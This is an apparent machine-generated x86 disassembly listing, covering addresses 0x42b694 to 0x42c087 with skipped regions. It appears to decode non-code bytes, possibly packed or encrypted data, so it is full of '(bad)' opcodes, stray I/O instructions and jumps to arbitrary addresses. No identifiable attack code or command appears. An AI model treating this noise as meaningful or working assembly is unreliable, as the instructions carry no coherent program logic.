  42b694:	clc    
  42b695:	ds sahf 
  42b697:	push   edx
  42b698:	xor    ch,ah
  42b69a:	call   0xadc9674b
  42b69f:	jb     0x42b645
  42b6a1:	cwde   
  42b6a2:	or     eax,0x1e93ff1d
  42b6a7:	ss ret 0x4962
  42b6ab:	lods   al,BYTE PTR ds:[esi]
  42b6ac:	mov    edi,0x548afe60
  42b6b1:	(bad)  
  42b6b2:	cld    
  42b6b3:	xor    DWORD PTR [eax+0x0],edi
	...
  42b716:	dec    esi
  42b717:	inc    edx
  42b718:	dec    ecx
  42b719:	daa    
  42b71a:	dec    ebp
  42b71b:	das    
  42b71c:	outs   dx,BYTE PTR ds:[esi]
  42b71d:	imul   eax,DWORD PTR [ebx],0xffffffcd
  42b720:	sub    BYTE PTR [ebp+0x66],bl
  42b723:	mov    dh,0xc8
  42b725:	jge    0x42b6f1
  42b727:	rol    BYTE PTR [ecx],1
  42b729:	add    BYTE PTR [edi],al
  42b72b:	add    DWORD PTR [eax],eax
  42b72d:	add    BYTE PTR [ecx-0x244c1ecc],ah
  42b733:	adc    ebp,DWORD PTR [ebx]
  42b735:	iret   
  42b736:	rcl    DWORD PTR [esi],cl
  42b738:	push   0x8b184487
  42b73d:	(bad)  
  42b73f:	pusha  
  42b740:	jg     0x42b6e7
  42b742:	popa   
  42b743:	add    al,0x72
  42b745:	and    ah,ah
  42b747:	and    edi,DWORD PTR [edx+eax*2-0x2cb5949b]
  42b74e:	es xchg esp,eax
  42b750:	dec    ebp
  42b751:	out    0xe5,eax
  42b753:	jmp    0xae85:0x26079bac
  42b75a:	test   BYTE PTR [eax+0x71],bh
  42b75d:	sbb    ebp,ebx
  42b75f:	pop    eax
  42b760:	ins    BYTE PTR es:[edi],dx
  42b761:	sar    ebp,0xa5
  42b764:	ja     0x42b7df
  42b766:	sub    eax,0x22a14147
  42b76b:	outs   dx,BYTE PTR ds:[esi]
  42b76c:	xchg   esp,eax
  42b76d:	stos   DWORD PTR es:[edi],eax
  42b76e:	jno    0x42b7e4
  42b770:	mov    ebx,0x85435e8d
  42b775:	sahf   
  42b776:	(bad)  [edi-0x74]
  42b779:	jmp    0x42b74d
  42b77b:	adc    eax,0x7428d5bd
  42b780:	ja     0x42b75b
  42b782:	add    eax,DWORD PTR [eax-0x23]
  42b785:	xchg   ebp,eax
  42b786:	dec    ecx
  42b787:	jmp    FWORD PTR [ebx]
  42b789:	xor    eax,DWORD PTR [ebx]
  42b78b:	mov    eax,ds:0x380244c3
  42b790:	je     0x42b729
  42b792:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b793:	cs mov edx,0xa7546755
  42b799:	aaa    
  42b79a:	in     al,0x96
  42b79c:	jg     0x42b733
  42b79e:	bound  esi,QWORD PTR [edx+0x71]
  42b7a1:	xchg   edx,eax
  42b7a2:	rcl    BYTE PTR [ebx+0x2ff52038],1
  42b7a8:	or     BYTE PTR [edx+ebp*2],cl
  42b7ab:	push   0xffffffb6
  42b7ad:	push   ebp
  42b7ae:	push   edx
  42b7af:	loopne 0x42b7bf
  42b7b1:	cmp    DWORD PTR [eax-0x2b],eax
  42b7b4:	lods   eax,DWORD PTR ds:[esi]
  42b7b5:	adc    al,0x1d
  42b7b7:	mov    ds:0x897a53ec,al
  42b7bc:	(bad)  
  42b7bd:	xchg   esi,eax
  42b7be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b7bf:	test   BYTE PTR [esi],cl
  42b7c1:	les    edi,FWORD PTR [eax-0x2d]
  42b7c4:	xchg   bl,dh
  42b7c6:	outs   dx,BYTE PTR ds:[esi]
  42b7c7:	imul   ebx,DWORD PTR [esi-0x2411ebb0],0x7
  42b7ce:	jg     0x42b82d
  42b7d0:	xchg   ebx,eax
  42b7d1:	test   ah,bl
  42b7d3:	std    
  42b7d4:	and    eax,0xcc08449
  42b7d9:	in     eax,dx
  42b7da:	push   0xffffffcc
  42b7dc:	out    dx,eax
  42b7dd:	sbb    eax,DWORD PTR [esi+edi*2-0x28b6e257]
  42b7e4:	sbb    ebp,ebx
  42b7e6:	and    BYTE PTR [ebx+0x4e],bh
  42b7e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b7ea:	loope  0x42b79a
  42b7ec:	sti    
  42b7ed:	aas    
  42b7ee:	cmp    eax,0xb1b0db6a
  42b7f3:	out    dx,eax
  42b7f4:	xor    al,BYTE PTR [esi+0x57]
  42b7f7:	ffree  st(1)
  42b7f9:	add    al,0x81
  42b7fb:	mov    eax,0x497a2244
  42b800:	fimul  DWORD PTR [edx]
  42b802:	pop    esi
  42b803:	scas   eax,DWORD PTR es:[edi]
  42b804:	mov    ds:0x9630c468,eax
  42b809:	cmp    al,0x96
  42b80b:	test   eax,0x185e0fbe
  42b810:	ror    bh,1
  42b812:	gs pop edi
  42b814:	adc    BYTE PTR [ecx-0x7558c0be],dl
  42b81a:	test   cl,dh
  42b81c:	mov    ch,0xb3
  42b81e:	or     bh,BYTE PTR [edx]
  42b820:	daa    
  42b821:	ja     0x42b893
  42b823:	or     eax,0x73c0e743
  42b828:	lea    esi,[edi]
  42b82a:	push   edx
  42b82b:	xchg   DWORD PTR ds:0x25ce58c0,ebx
  42b831:	stos   BYTE PTR es:[edi],al
  42b832:	xor    BYTE PTR [eax+0x7e],ah
	...
  42b895:	add    al,ch
  42b897:	popf   
  42b898:	mov    esi,0xf9e7ffe7
  42b89d:	lahf   
  42b89e:	xor    bl,dh
  42b8a0:	add    ecx,DWORD PTR [esi+0xf9761d0]
  42b8a6:	rcl    ecx,1
  42b8a8:	add    DWORD PTR [eax],eax
  42b8aa:	pop    es
  42b8ab:	add    DWORD PTR [eax],eax
  42b8ad:	add    ah,dh
  42b8af:	lods   eax,DWORD PTR ds:[esi]
  42b8b0:	push   edx
  42b8b1:	sbb    DWORD PTR [eiz*2-0x353bab58],0xb
  42b8b9:	rcr    DWORD PTR [ebx+ecx*4-0x44e027b1],1
  42b8c0:	mov    ebp,0x265d171b
  42b8c5:	mov    esp,0xa948404f
  42b8ca:	jmp    0x28ac44b4
  42b8cf:	push   ebx
  42b8d0:	pop    esp
  42b8d1:	lock mov ebp,DWORD PTR [ebp+0x11]
  42b8d5:	std    
  42b8d6:	inc    esp
  42b8d7:	into   
  42b8d8:	cs sbb al,0xb1
  42b8db:	mov    al,0x35
  42b8dd:	out    0x90,eax
  42b8df:	jb     0x42b876
  42b8e1:	xchg   DWORD PTR gs:[ebx-0x230fbb07],edi
  42b8e8:	xchg   esi,eax
  42b8e9:	and    BYTE PTR [ecx],ah
  42b8eb:	scas   eax,DWORD PTR es:[edi]
  42b8ec:	shl    DWORD PTR ds:0x860302ab,0xac
  42b8f3:	test   ecx,ebx
  42b8f5:	sbb    ch,BYTE PTR [edx+0x75]
  42b8f8:	jle    0x42b942
  42b8fa:	adc    edi,DWORD PTR [eax+0x63]
  42b8fd:	imul   eax,esp,0x84257e4b
  42b903:	mov    eax,0xdd33adb0
  42b908:	mov    ecx,0x5afadc80
  42b90d:	push   edi
  42b90e:	push   es
  42b90f:	cld    
  42b910:	dec    edi
  42b911:	and    DWORD PTR [esi],edi
  42b913:	(bad)  
  42b914:	xor    eax,0x66c9bc93
  42b919:	ret    0xa4bc
  42b91c:	push   ecx
  42b91d:	inc    esi
  42b91e:	push   ss
  42b91f:	xchg   ebx,eax
  42b920:	lods   eax,DWORD PTR ds:[esi]
  42b921:	test   BYTE PTR [edi+0x65],cl
  42b924:	lods   al,BYTE PTR ds:[esi]
  42b925:	add    al,BYTE PTR [esi+0x40c17ef9]
  42b92b:	adc    ecx,eax
  42b92d:	mov    ebx,0x509eaa51
  42b932:	mov    dl,0x16
  42b934:	fmul   DWORD PTR [ebp-0x2d08ab10]
  42b93a:	pop    DWORD PTR [edx-0x3356239e]
  42b940:	inc    edx
  42b941:	aad    0x27
  42b943:	les    edi,FWORD PTR [ebp+0x34]
  42b946:	mov    ds:0x5a68ece2,eax
  42b94b:	retf   0xbe27
  42b94e:	test   al,0xea
  42b950:	stos   BYTE PTR es:[edi],al
  42b951:	out    dx,eax
  42b952:	sub    cl,BYTE PTR [ecx]
  42b954:	test   BYTE PTR [ebx],ah
  42b956:	(bad)  
  42b957:	cmp    BYTE PTR [ebx+0x54ce63f0],dl
  42b95d:	sahf   
  42b95e:	and    BYTE PTR [edi-0x18],cl
  42b961:	ret    0xa325
  42b964:	leave  
  42b965:	cmp    esp,edx
  42b967:	pop    ds
  42b968:	sub    DWORD PTR [edx-0x18],0xffffffa3
  42b96c:	fst    QWORD PTR [edx+0x71bfce71]
  42b972:	imul   esi,edx,0xcbcb6928
  42b978:	(bad)
  42b97c:	test   eax,0x5aaa0ef3
  42b981:	jo     0x42b956
  42b983:	xchg   ecx,eax
  42b984:	and    BYTE PTR [edx],bh
  42b986:	mov    DWORD PTR [eax+edx*2],edx
  42b989:	and    ebx,DWORD PTR [ebx]
  42b98b:	mov    WORD PTR [esi+0x39],?
  42b98e:	dec    ebp
  42b98f:	mov    ds:0xe52b8fdf,eax
  42b994:	mov    dh,0x7a
  42b996:	jge    0x42b99a
  42b998:	loop   0x42b922
  42b99a:	xchg   ebp,eax
  42b99b:	pusha  
  42b99c:	pop    ecx
  42b99d:	popf   
  42b99e:	imul   DWORD PTR [edx-0x19]
  42b9a1:	mov    al,0xd8
  42b9a3:	jo     0x42b9f2
  42b9a5:	sub    bl,bl
  42b9a7:	sahf   
  42b9a8:	fnsave [edi-0x5658ed19]
  42b9ae:	js     0x42b9dd
  42b9b0:	jo     0x42ba29
  42b9b2:	shl    eax,cl
  42b9b4:	push   esp
	...
  42ba15:	add    BYTE PTR [ebx-0x431d4ff9],cl
  42ba1b:	neg    ebx
  42ba1d:	outs   dx,DWORD PTR ds:[esi]
  42ba1e:	xor    DWORD PTR [eax-0x80],eax
  42ba21:	fldcw  WORD PTR [esi-0x27af57ff]
  42ba27:	rol    BYTE PTR [ecx],cl
  42ba29:	add    BYTE PTR [edi],al
  42ba2b:	add    DWORD PTR [eax],eax
  42ba2d:	add    BYTE PTR [ebx],al
  42ba2f:	cmp    al,0xc
  42ba31:	mov    BYTE PTR ds:0xa3ea4579,bh
  42ba37:	setns  BYTE PTR [ecx-0xe9f7810]
  42ba3e:	aas    
  42ba3f:	test   ebx,0xe287f07
  42ba45:	iret   
  42ba46:	xchg   ebp,eax
  42ba47:	in     al,dx
  42ba48:	in     eax,0x72
  42ba4a:	clc    
  42ba4b:	(bad)  
  42ba4c:	fidivr WORD PTR [esi]
  42ba4e:	or     DWORD PTR [ebx+0x6e],ebp
  42ba51:	mov    bp,0x8214
  42ba55:	lock mov dh,0x92
  42ba58:	inc    edi
  42ba59:	lods   al,BYTE PTR ds:[esi]
  42ba5a:	rcl    BYTE PTR [ebp-0x71],cl
  42ba5d:	dec    esi
  42ba5e:	das    
  42ba5f:	(bad)  
  42ba60:	(bad)  
  42ba61:	jne    0x42b9e5
  42ba63:	repnz push edx
  42ba65:	pop    edx
  42ba66:	mov    bh,0x4b
  42ba68:	adc    ah,BYTE PTR [ebx-0x3d]
  42ba6b:	xor    DWORD PTR [esi-0x19cd423a],esi
  42ba71:	xor    DWORD PTR [eax],0x4f
  42ba74:	xchg   edi,eax
  42ba75:	inc    eax
  42ba76:	cmp    edi,DWORD PTR [esi]
  42ba78:	fbstp  TBYTE PTR [ebx]
  42ba7a:	mov    eax,0xb42c86cd
  42ba7f:	pop    esp
  42ba80:	das    
  42ba81:	mov    ds:0x539e71b,al
  42ba86:	pop    ecx
  42ba87:	ins    DWORD PTR es:[edi],dx
  42ba88:	jo     0x42ba15
  42ba8a:	inc    edx
  42ba8b:	dec    ebx
  42ba8c:	cdq    
  42ba8d:	mov    ds:0xa63c46fb,eax
  42ba92:	lods   al,BYTE PTR ds:[esi]
  42ba93:	mov    esp,esi
  42ba95:	scas   al,BYTE PTR es:[edi]
  42ba96:	xchg   ebx,eax
  42ba97:	jmp    0x42baaf
  42ba99:	pop    es
  42ba9a:	ja     0x42ba9a
  42ba9c:	and    BYTE PTR es:0xbc5288a6,ch
  42baa3:	push   esi
  42baa4:	jle    0x42bafa
  42baa6:	mov    eax,ds:0x6be3f1c2
  42baab:	jl     0x42baf1
  42baad:	xchg   esi,eax
  42baae:	mov    al,ds:0x5beb6896
  42bab4:	(bad)  
  42bab5:	cmp    al,0x2b
  42bab7:	mov    edi,ss
  42bab9:	mov    bl,0xb8
  42babb:	retf   0xed35
  42babe:	mov    cl,0x2d
  42bac0:	mov    BYTE PTR [edx],bh
  42bac2:	add    eax,0xa3b65e95
  42bac7:	mov    dh,0xe2
  42bac9:	mov    ecx,0x63ed70c4
  42bace:	lods   al,BYTE PTR ds:[esi]
  42bacf:	cmp    DWORD PTR [edx+0x63],edi
  42bad2:	or     bh,BYTE PTR [eax-0x7d]
  42bad5:	pop    ebp
  42bad6:	dec    esi
  42bad7:	push   eax
  42bad8:	pop    esi
  42bad9:	mov    ebp,0x13c41e9f
  42bade:	int    0x24
  42bae0:	aas    
  42bae1:	jbe    0x42ba8b
  42bae3:	and    DWORD PTR [edi+eax*2],ebx
  42bae6:	shr    DWORD PTR ds:0xe2620451,1
  42baec:	or     ah,ch
  42baee:	jb     0x42bab5
  42baf0:	popf   
  42baf1:	push   0xffffffae
  42baf3:	mov    esp,0x59341901
  42baf8:	pop    edx
  42baf9:	pop    esp
  42bafa:	lahf   
  42bafb:	xchg   ebx,eax
  42bafc:	adc    eax,eax
  42bafe:	cmp    BYTE PTR [eax-0x5c],0x27
  42bb02:	inc    eax
  42bb03:	(bad)  
  42bb04:	icebp  
  42bb05:	jmp    0x6cc39bb4
  42bb0a:	add    ecx,DWORD PTR [edi-0x43ae602b]
  42bb10:	dec    ebp
  42bb11:	jl     0x42bb0a
  42bb13:	lock cmp DWORD PTR [edx+ebp*4-0x22],esp
  42bb18:	(bad)  
  42bb19:	lahf   
  42bb1a:	jp     0x42bb6c
  42bb1c:	mov    edx,0xbd2bcafe
  42bb21:	pop    edi
  42bb22:	or     BYTE PTR [esi*1+0x59b47026],bl
  42bb29:	clc    
  42bb2a:	out    0x9b,eax
  42bb2c:	test   eax,0x3940f382
  42bb31:	xchg   ebp,eax
  42bb32:	adc    ah,BYTE PTR [edi]
  42bb34:	fwait
	...
  42bb95:	add    BYTE PTR [eax+ebp*1],dh
  42bb98:	add    DWORD PTR [esi],eax
  42bb9a:	sbb    eax,0x283a372f
  42bb9f:	in     al,0xd1
  42bba1:	and    esp,DWORD PTR [esi]
  42bba3:	int3   
  42bba4:	and    BYTE PTR [esi],bl
  42bba6:	(bad)  
  42bba8:	add    DWORD PTR [eax],eax
  42bbaa:	pop    es
  42bbab:	add    DWORD PTR [eax],eax
  42bbad:	add    BYTE PTR [eax-0x26],bh
  42bbb0:	adc    BYTE PTR [esi-0x26d7c607],dl
  42bbb6:	inc    edx
  42bbb7:	lods   al,BYTE PTR ds:[esi]
  42bbb8:	outs   dx,DWORD PTR ds:[esi]
  42bbb9:	jns    0x42bc25
  42bbbb:	dec    eax
  42bbbc:	imul   edx,DWORD PTR [esi],0x55
  42bbbf:	pop    edi
  42bbc0:	mov    ecx,0xcfc08fd4
  42bbc5:	or     al,bl
  42bbc7:	add    al,0xf4
  42bbc9:	cwde   
  42bbca:	out    0xe8,al
  42bbcc:	popf   
  42bbcd:	popf   
  42bbce:	mov    BYTE PTR [ecx+eiz*4+0x6703],cl
  42bbd5:	outs   dx,BYTE PTR ds:[esi]
  42bbd6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42bbd7:	xchg   edi,eax
  42bbd8:	or     al,0x1c
  42bbda:	pop    ecx
  42bbdb:	push   esi
  42bbdc:	mov    dh,0x25
  42bbde:	adc    bl,BYTE PTR [esi+0x612bfe97]
  42bbe4:	out    dx,al
  42bbe5:	dec    esp
  42bbe6:	into   
  42bbe7:	inc    edx
  42bbe8:	out    dx,eax
  42bbe9:	(bad)  
  42bbea:	lahf   
  42bbeb:	sub    al,0x99
  42bbed:	cmp    eax,0x5b27b534
  42bbf2:	jmp    FWORD PTR [esi+eiz*4]
  42bbf5:	push   edx
  42bbf6:	jl     0x42bc48
  42bbf8:	jbe    0x42bbe1
  42bbfa:	in     eax,dx
  42bbfb:	and    eax,0xfd3abbba
  42bc00:	and    DWORD PTR [eax+0x77],0x32
  42bc04:	das    
  42bc05:	sti    
  42bc06:	dec    esi
  42bc07:	push   cs
  42bc08:	cmc    
  42bc09:	xchg   esi,eax
  42bc0a:	fucomi st,st(4)
  42bc0c:	cmp    ah,cl
  42bc0e:	cmp    BYTE PTR [edx-0x11],al
  42bc11:	jecxz  0x42bc87
  42bc13:	sub    ch,BYTE PTR [esi+eax*1]
  42bc16:	mov    esi,0x76ee2b8
  42bc1b:	aad    0x71
  42bc1d:	push   ecx
  42bc1e:	fld    TBYTE PTR [ecx-0x2b]
  42bc21:	pop    edx
  42bc22:	(bad)  
  42bc23:	lock add ebx,DWORD PTR [ebx+edx*1]
  42bc27:	mov    esp,0xa2ada621
  42bc2c:	xchg   BYTE PTR ds:0xf86e294e,ah
  42bc32:	or     eax,0xb269b20b
  42bc37:	adc    BYTE PTR [ecx],cl
  42bc39:	add    ebp,DWORD PTR [edx-0x3d]
  42bc3c:	push   esp
  42bc3d:	push   ss
  42bc3e:	sub    WORD PTR [esi+0x50],cx
  42bc42:	push   eax
  42bc43:	loopne 0x42bbda
  42bc45:	cmc    
  42bc46:	aam    0xec
  42bc48:	and    BYTE PTR [edi],bh
  42bc4a:	add    al,0x7a
  42bc4c:	or     eax,ebx
  42bc4e:	and    eax,0x634a03c
  42bc53:	test   al,0xfa
  42bc55:	mov    ecx,0xb97607ce
  42bc5a:	and    DWORD PTR [esi+0x69551307],0x65
  42bc61:	cmp    DWORD PTR [ecx-0x21135a34],edi
  42bc67:	test   eax,0x7fce2941
  42bc6c:	dec    eax
  42bc6d:	call   DWORD PTR [eax]
  42bc6f:	mov    ebx,0x697a00b7
  42bc74:	xor    ah,BYTE PTR [edx+0x4882f80d]
  42bc7a:	lods   al,BYTE PTR ds:[esi]
  42bc7b:	in     eax,dx
  42bc7c:	or     BYTE PTR [eax+0x2a9f8171],bl
  42bc82:	xor    BYTE PTR [eax],bl
  42bc84:	mov    ds:0x4da5c46e,eax
  42bc89:	jp     0x42bc24
  42bc8b:	jo     0x42bcd2
  42bc8d:	shl    DWORD PTR [ebx+0x13b04bfa],cl
  42bc93:	ins    DWORD PTR es:[edi],dx
  42bc94:	pop    ss
  42bc95:	mov    cl,0x7b
  42bc97:	pop    eax
  42bc98:	test   eax,0xcaa980c7
  42bc9d:	aaa    
  42bc9e:	mov    BYTE PTR [edx+0xb],0x3
  42bca2:	stc    
  42bca3:	xchg   ebx,eax
  42bca4:	or     edx,DWORD PTR [edx+0x166b96f9]
  42bcaa:	mov    al,0x9e
  42bcac:	jae    0x42bcdc
  42bcae:	icebp  
  42bcaf:	xchg   ebx,eax
  42bcb0:	inc    esi
  42bcb1:	outs   dx,BYTE PTR ds:[esi]
  42bcb2:	cs jg  0x42bc9d
	...
  42bd15:	add    BYTE PTR [eax-0x61eb634a],dh
  42bd1b:	ds mov eax,0xde938ab6
  42bd21:	stc    
  42bd22:	xchg   edi,eax
  42bd23:	sub    BYTE PTR [edi-0x55],bl
  42bd26:	out    0xd4,al
  42bd28:	add    DWORD PTR [eax],eax
  42bd2a:	pop    es
  42bd2b:	add    DWORD PTR [eax],eax
  42bd2d:	add    BYTE PTR [edi-0x1041f90b],ch
  42bd33:	(bad)  
  42bd34:	dec    BYTE PTR [esi]
  42bd36:	stos   BYTE PTR es:[di],al
  42bd38:	mov    ds:0xf9904c4a,eax
  42bd3d:	dec    esp
  42bd3e:	lds    ebp,FWORD PTR [ebx+ebp*2+0x73]
  42bd42:	inc    DWORD PTR [esi+0x49]
  42bd45:	mov    fs,WORD PTR cs:[edi]
  42bd48:	and    ch,BYTE PTR [ebp-0x11]
  42bd4b:	jae    0x42bd1a
  42bd4d:	(bad)  
  42bd4e:	jno    0x42bd91
  42bd50:	dec    esp
  42bd51:	sub    bh,BYTE PTR [edi-0x36d73f17]
  42bd57:	jne    0x42bd69
  42bd59:	popf   
  42bd5a:	rcl    DWORD PTR [ecx-0x517f5c0f],0x4b
  42bd61:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42bd62:	pushf  
  42bd63:	or     DWORD PTR [eax],ecx
  42bd65:	fild   QWORD PTR ss:[ebp-0x2]
  42bd69:	into   
  42bd6a:	rcl    ebp,0x40
  42bd6d:	cs cdq 
  42bd6f:	jnp    0x42bd90
  42bd71:	es test eax,0xbd2ef56b
  42bd77:	out    0x86,eax
  42bd79:	jae    0x42bd00
  42bd7b:	fsubp  st(1),st
  42bd7d:	lahf   
  42bd7e:	xor    BYTE PTR [edi+ebp*1+0x62efe2ab],dh
  42bd85:	add    dh,BYTE PTR [ebp+0x53]
  42bd88:	xchg   ebx,eax
  42bd89:	std    
  42bd8a:	xor    ecx,DWORD PTR [edx]
  42bd8c:	or     al,0x31
  42bd8e:	(bad)  
  42bd8f:	fsub   QWORD PTR [eax+0x7e90421d]
  42bd95:	pusha  
  42bd96:	aad    0xcd
  42bd98:	nop
  42bd99:	test   BYTE PTR [esi-0x3],0xd3
  42bd9d:	into   
  42bd9e:	xlat   BYTE PTR ds:[ebx]
  42bd9f:	jg     0x42bd4d
  42bda1:	cmp    eax,0xb9287880
  42bda6:	mov    al,0xff
  42bda8:	int    0xcf
  42bdaa:	jecxz  0x42bdc0
  42bdac:	cdq    
  42bdad:	inc    ecx
  42bdae:	jbe    0x42be1f
  42bdb0:	pop    esp
  42bdb1:	add    dl,BYTE PTR [esi+edi*4-0x38]
  42bdb5:	outs   dx,BYTE PTR ds:[esi]
  42bdb6:	adc    ebx,DWORD PTR ds:0x7612c3e6
  42bdbc:	inc    eax
  42bdbd:	scas   eax,DWORD PTR es:[edi]
  42bdbe:	idiv   DWORD PTR [ebx-0x37]
  42bdc1:	in     eax,dx
  42bdc2:	push   0x8a410290
  42bdc7:	rol    BYTE PTR es:[edx-0x5a],1
  42bdcb:	xchg   edi,eax
  42bdcc:	lods   eax,DWORD PTR ds:[esi]
  42bdcd:	mov    BYTE PTR [ecx+0x26f28bbd],al
  42bdd3:	xchg   BYTE PTR [esp+eax*4+0x3dd294c6],ah
  42bdda:	push   esi
  42bddb:	es call 0x4cdbfb81
  42bde1:	add    ecx,edx
  42bde3:	push   edi
  42bde4:	push   ebx
  42bde5:	sar    DWORD PTR [edi+0x28],0xf1
  42bde9:	xor    ax,WORD PTR cs:[edx+0x58]
  42bdee:	stc    
  42bdef:	jle    0x42be2a
  42bdf1:	stos   DWORD PTR es:[edi],eax
  42bdf2:	fwait
  42bdf3:	loop   0x42be03
  42bdf5:	add    eax,0xf0b1b1be
  42bdfa:	adc    ch,0x55
  42bdfd:	xchg   ecx,eax
  42bdfe:	sar    DWORD PTR [esi-0x78],cl
  42be01:	leave  
  42be02:	inc    ecx
  42be03:	fsub   DWORD PTR [eax+0x423f7e70]
  42be09:	mov    bl,al
  42be0b:	push   esp
  42be0c:	pop    esi
  42be0d:	test   eax,0x78c78f2a
  42be12:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42be13:	or     DWORD PTR [edx+esi*8],ecx
  42be16:	loope  0x42bdf9
  42be18:	addr16 push eax
  42be1a:	hlt    
  42be1b:	test   BYTE PTR [edi+0x32],dh
  42be1e:	fimul  DWORD PTR [esi+0x3b913ebf]
  42be25:	mov    esi,0xc300c8cc
  42be2a:	ret    0xf9fa
  42be2d:	push   ebp
  42be2e:	push   esp
  42be2f:	in     eax,dx
  42be30:	(bad)  [edi]
  42be32:	pop    es
  42be33:	je     0x42bdc0
	...
  42be95:	add    BYTE PTR [edi-0x825b8e0],dl
  42be9b:	call   FWORD PTR [edi-0x24a78c93]
  42bea1:	fst    st(7)
  42bea3:	push   es
  42bea4:	in     al,0xd4
  42bea6:	in     eax,dx
  42bea7:	aad    0x1
  42bea9:	add    BYTE PTR [edi],al
  42beab:	add    DWORD PTR [eax],eax
  42bead:	add    ch,cl
  42beaf:	mov    al,ds:0xb57669e5
  42beb4:	adc    al,0xc2
  42beb6:	out    0x9c,eax
  42beb8:	pop    esp
  42beb9:	dec    esp
  42beba:	add    eax,0xca1777d6
  42bebf:	loope  0x42be80
  42bec1:	mov    ebx,0xc7e841bc
  42bec6:	mov    WORD PTR [edi],es
  42bec8:	rol    al,1
  42beca:	or     BYTE PTR [esi],cl
  42becc:	xor    eax,0x2159aa17
  42bed1:	xlat   BYTE PTR ds:[ebx]
  42bed2:	fdiv   QWORD PTR ds:[edi-0xfc90cf6]
  42bed9:	xchg   ebx,eax
  42beda:	jmp    0x42bf15
  42bedc:	bound  edx,QWORD PTR [ecx+0x7f7f9b3d]
  42bee2:	inc    eax
  42bee3:	stc    
  42bee4:	sub    DWORD PTR [esi],0xe4c740ff
  42beea:	mov    ebx,gs
  42beec:	mov    ecx,0xc473fae3
  42bef1:	je     0x42bed2
  42bef3:	div    BYTE PTR [esi]
  42bef5:	mov    bh,0x63
  42bef7:	cld    
  42bef8:	and    BYTE PTR [ebx-0x30],0x90
  42befc:	jae    0x42becc
  42befe:	or     eax,0x1124a1ea
  42bf03:	sub    eax,0xb5dd72f
  42bf08:	(bad)  
  42bf09:	hlt    
  42bf0a:	inc    esp
  42bf0b:	rcr    BYTE PTR ds:[esi],1
  42bf0e:	sub    eax,0xf25bf467
  42bf13:	imul   ecx,DWORD PTR [ebx],0xb047501e
  42bf19:	mov    eax,0xc2e0ec5
  42bf1e:	repnz loopne 0x42bedc
  42bf21:	test   BYTE PTR [edx+ebp*1],bl
  42bf24:	inc    ebx
  42bf25:	mov    ch,BYTE PTR [edx+0x5921083e]
  42bf2b:	sub    edi,esp
  42bf2d:	mov    dl,0x5
  42bf2f:	pop    ss
  42bf30:	push   edi
  42bf31:	mov    esi,0xc21c7274
  42bf36:	fs loop 0x42bf63
  42bf39:	xchg   esi,eax
  42bf3a:	jmp    0x42bf9c
  42bf3c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42bf3d:	xor    eax,0xd5a8e2c0
  42bf42:	inc    ebx
  42bf43:	pop    edx
  42bf44:	test   eax,0xca0f998a
  42bf49:	loop   0x42bf1e
  42bf4b:	sub    cl,bh
  42bf4d:	mov    ah,0xbf
  42bf4f:	rol    BYTE PTR [ebp-0x674aebe4],cl
  42bf55:	inc    eax
  42bf56:	ret    0x9162
  42bf59:	xchg   edi,eax
  42bf5a:	test   DWORD PTR [ebp+0x494914a],ebx
  42bf60:	repnz xchg ebp,eax
  42bf62:	mov    ds:0x5ab54385,al
  42bf67:	fmul   DWORD PTR [esp+ecx*8-0x29fdad3f]
  42bf6e:	add    eax,0xf5783aa2
  42bf73:	xlat   BYTE PTR ds:[ebx]
  42bf74:	fsub   QWORD PTR [esi+0x6466f243]
  42bf7a:	cmp    dl,BYTE PTR [edx]
  42bf7c:	dec    eax
  42bf7d:	fsub   DWORD PTR [ebx+0x7b]
  42bf80:	fwait
  42bf81:	add    bl,dl
  42bf83:	push   ecx
  42bf84:	fsub   DWORD PTR [edx+eax*2+0x2e]
  42bf88:	cdq    
  42bf89:	aas    
  42bf8a:	out    0xf8,al
  42bf8c:	loop   0x42bf37
  42bf8e:	inc    ebx
  42bf8f:	pushf  
  42bf90:	(bad)  
  42bf91:	(bad)  
  42bf92:	fadd   QWORD PTR ds:0x9176cec9
  42bf98:	aaa    
  42bf99:	jmp    0x42bfd6
  42bf9b:	inc    edx
  42bf9c:	outs   dx,BYTE PTR ds:[esi]
  42bf9d:	dec    ebp
  42bf9e:	push   cs
  42bf9f:	inc    ecx
  42bfa0:	cmp    dh,cl
  42bfa2:	(bad)  
  42bfa4:	sub    BYTE PTR [eax+0x3],cl
  42bfa7:	clc    
  42bfa8:	cdq    
  42bfa9:	fwait
  42bfaa:	mov    esp,0x47b40be0
  42bfaf:	jo     0x42bf5e
  42bfb1:	in     eax,dx
  42bfb2:	sub    DWORD PTR [ecx],0xb0
	...
  42c014:	add    BYTE PTR [eax],al
  42c016:	cmp    dl,BYTE PTR [edx-0x800cd89]
  42c01c:	jg     0x42bfb8
  42c01e:	xchg   ebx,eax
  42c01f:	mov    al,ds:0xbf58f806
  42c024:	and    eax,0x1d6f460
  42c029:	add    BYTE PTR [edi],al
  42c02b:	add    DWORD PTR [eax],eax
  42c02d:	add    dl,bh
  42c02f:	mov    eax,ds:0xafddcf65
  42c034:	sub    eax,0x5600efb2
  42c039:	mov    dh,0x4c
  42c03b:	sbb    BYTE PTR [ebx+0x7e8affcc],bh
  42c041:	cmp    ch,BYTE PTR [ecx]
  42c043:	pop    ebx
  42c044:	mov    dl,0x4e
  42c046:	lods   eax,DWORD PTR ds:[esi]
  42c047:	adc    BYTE PTR [esi],cl
  42c049:	scas   al,BYTE PTR es:[edi]
  42c04a:	out    0xe8,eax
  42c04c:	jmp    0x27823fd3
  42c051:	xor    dh,BYTE PTR [eax+ebp*2]
  42c054:	ja     0x42c0d0
  42c056:	or     edi,DWORD PTR [ebx+eiz*4-0x5b6b2949]
  42c05d:	bnd jp 0x42c05b
  42c060:	and    dh,BYTE PTR [edi+0x77]
  42c063:	clc    
  42c064:	fsub   st(7),st
  42c066:	cmp    DWORD PTR [eiz*4-0x6033c368],edx
  42c06d:	mov    eax,ds:0x6e91ab7
  42c072:	mov    dl,0x2b
  42c074:	ins    BYTE PTR es:[edi],dx
  42c075:	call   0xeba6d53c
  42c07a:	repz imul ebp,eax,0xffffffb0
  42c07e:	jmp    0x7bee:0x3c63221c
  42c085:	in     al,dx
  42c086:	push   eax
  42c087:	(bad)  
